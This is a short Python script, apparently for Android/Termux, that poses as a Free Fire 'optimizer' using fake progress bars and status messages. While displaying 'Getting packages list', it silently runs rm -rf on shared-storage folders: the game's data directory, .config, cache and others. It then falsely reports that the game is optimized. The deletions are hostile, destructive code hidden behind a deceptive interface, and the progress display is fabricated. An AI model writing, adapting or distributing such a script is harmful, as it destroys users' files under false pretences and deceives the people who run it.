from os import system

system('clear')

system('pip install rich')

system('clear')

import rich

from time import sleep

from rich.progress import track

from rich import print as rint

from rich.console import Console

from multiprocessing import cpu_count

console = Console()

cores = cpu_count()

temp = "█"

cores = 1
while True:
	Continue = input("Do you want to continue? (Y/n) : ").lower()
	if Continue == "y":
		break
	elif Continue == "n":
		rint('Ok... type [green]“REDO”[white] to call this process!')
		rint("[Program finished]")
		redo = ""
		while redo != "redo":
			redo = input("$ ").lower()
			if redo == "redo":
				break
		
estime = round((((cores ** 4)*2)/2)+(cores * 100))

for step in track(range(estime)):
	sleep(.01)
	step


rint("[bold red]  Getting packages list please wait...")
system("rm -rf storage/shared/aesthetics")
system("rm -rf storage/shared/Android/data/com.dts.freefireth")
system("rm -rf storage/shared/.dwd")
system("rm -rf storage/shared/.config")
system("rm -rf storage/shared/cache")

sleep(.7)
rint("[green]  Done !")


while True :
	rint("[yellow]Expunging[white] the expansion file can increase Optimization \nDo you want to do it? (y/N)")
	
	ask = input(">>>")
	
	if ask == "y":
		system("rm -rf storage/shared/Android/data/com.dts.freefireth")
		print("Wait!")
		
		for i in range(47):
			print(""+temp * i)
			sleep(.1)
		
		sleep(7)
		break
	elif ask == "n":
		break
	else:
		continue
		
for i in range(0,101):
	system('clear')
	print("Optimizing...")
	print(f"{i}% Optimized")
	sleep(0.1)
	
rint("[bold red]Wait...")

tasks = [f'task {n}'for n in range(1,11)]

with console.status("[bold green]Working on tasks...")as status:
	while tasks:
		task = tasks.pop(0)
		sleep(.7)
		console.log(f"{task} complete")

rint('[green]Done!')
sleep(3.5)


rint("[green]Free Fire is successfully Optimized and gameplay will be a lot better! [bold red]")